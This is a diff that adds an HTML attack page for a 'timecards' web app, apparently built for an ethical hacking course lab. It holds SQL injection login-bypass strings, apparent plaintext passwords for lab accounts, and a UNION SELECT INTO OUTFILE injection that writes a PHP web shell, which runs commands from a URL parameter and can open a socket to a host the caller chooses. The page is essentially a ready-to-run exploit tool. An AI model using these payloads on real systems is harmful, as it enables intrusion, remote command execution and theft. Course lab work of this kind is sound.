@@ -1,0 +1,118 @@
+<!DOCTYPE html><html lang="en">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Timecard attack</title>
+ <script>
+function toHex(s) {
+    var ret='';
+    for (var i=0; i < s.length; i++ ) {
+      ret += ("000"+ s.charCodeAt(i).toString(16)).slice(-2) ; }
+     return "UNHEX('" + ret + "')" ; }  
+function sql_enc(s) {
+   s=s.replace(/\\/g,"\\\\"); 
+   s=s.replace(/'/g,"\\'"); 
+   s=s.replace(/"/g,'\\"'); 
+   // s=s.replace(/\n/g,"\\n"); 
+   // s=s.replace(/\r/g,"\\r"); 
+    return '"' + s + '"';
+}
+// type_id
+function setTaTypeId() {
+    var fc = document.getElementById("fcta0");
+    var fn = document.getElementById("fninp0");
+    var tid = document.getElementById("tid");
+    var frmet = document.getElementById("frmet");
+    tid.value = ('7780699 union all select ' +
+        sql_enc(fc.value) +" into OUTFILE '" +
+        fn.value + "' FIELDS ESCAPED BY '' ;#");
+}
+function inject0_cb() {
+    setTaTypeId();
+    frmet.submit();
+}
+const niceDoorStr = (
+    "<title>nicedoor</title><?php if(!array_key_exists('nh',$_GET)) { ?><h1>nice door</h1><?php } ?>" +
+    "<? if ( (isset( $_GET['rh']) and isset( $_GET['rp'])) or (isset($_POST['rh']) and isset($_POST['rp'])) ) { $s=fsockopen($_GET['rh'] ?? $_POST['rh'], $_GET['rp'] ?? $_POST['rp']); } ?>" +
+    "<pre><?php echo  htmlspecialchars(shell_exec($_POST['cmd'] ?? $_GET['cmd']), ENT_QUOTES);?></pre>"
+);
+function seter_cb(evt) {
+    console.log(evt.target.id);
+    let tid=evt.target.id;
+    const setvs = {
+        'pass-set-btn' :[
+            ['tcl-un',"' or 1=1 limit 1;#"],
+            ['tcl-pw',"' or 1=1#"]
+        ],
+        'nd-set-btn' :[
+            ['fcta0',niceDoorStr],
+            ['fninp0','/var/www/html/swancorp/nicedoor.php']
+        ]
+    }
+    console.log(setvs[tid]);
+    for (vs of setvs[tid]) {
+        /* console.log(vs);console.log(vs[0]);
+        console.log(document.getElementById(vs[0])); */
+        document.getElementById(vs[0]).value = vs[1];
+    }
+    if ('nd-set-btn' === tid ) {setTaTypeId();}
+}
+ </script>
+ <h1>attack the timecards</h1>
+ <h2>login to timecards</h2>
+ <form method=post action=http://fishstick/swancorp/timecards/index.php
+     target=_blank id=frmlogin>
+   un<input type=text id=tcl-un name=username list=tcusers size=25>
+   pw<input type=text id=tcl-pw name=password list=tcpws size=25>
+   <input type=submit value=login >
+   <input type="button" class=seterbtn value="set SQLi bypass"
+      id="pass-set-btn">
+ </form>
+ <p>' or 1=1# admin alice bswan 88pass ijr 39</p>
+ <datalist id=tcusers>
+    <option>' or 1=1#</option>
+    <option>' or 1=1 limit 1;#</option>
+    <option>admin</option>
+    <option>alice</option>
+    <option>bswan</option>
+    <option>admin'#</option>
+    <option>alice'#</option>
+    <option>bswan'#</option>
+ </datalist>
+ <datalist id=tcpws >
+    <option>' or 1=1#</option>
+    <option>' or 1=1 limit 1;#</option>
+    <option>admin88passw0rd71</option>
+    <option>ijrREworKLFCMkjnesfFNEFJk</option>
+    <option>39IFJIJFjfjpoiweroJIERWjEWRI</option>
+ </datalist>
+ 
+ <a href=file:////home/student/scan/time-attack.html > myself lcl</a>
+<a href=https://pollei.github.io/sfcc-cyber-bas/CYBR320/ target=_blank
+   >SFCC CYBR 320 Ethical Hacking</a>
+<a href=https://pollei.github.io/sfcc-cyber-bas/CYBR320/time-attack.html target=_blank
+   >time-attack</a>
+<a href=https://pollei.github.io/sfcc-cyber-bas/CYBR320/doorkeep.html target=_blank
+   >doorkeep</a>
+
+   <h2>inject ascii file</h2>
+   <div>
+     <form action=http://fishstick/swancorp/timecards/edit_type.php
+         method=get target=_blank id=frmet>
+       <textarea name=fc id=fcta0 cols=120 rows=22 >&lt;?php echo shell_exec($_GET['cmd']);?&gt;</textarea>
+       <fieldset>
+            <input name=fn id=fninp0 value="/var/www/html/swancorp/" size=120 ></input>
+            <input type=button value='inject file' onclick="inject0_cb()" ></input>
+            <input type="button" class=seterbtn value="set nicedoor defaults"
+              id="nd-set-btn">
+        </fieldset>
+       <textarea name=type_id id=tid cols=120 rows=24 disabled ></textarea>
+       
+     </form></div>
+
+     <script>
+    (function (){
+        let sbuts = document.getElementsByClassName("seterbtn");
+        for (sb of sbuts) {sb.addEventListener("click", seter_cb) ;}
+    })()
+     </script>
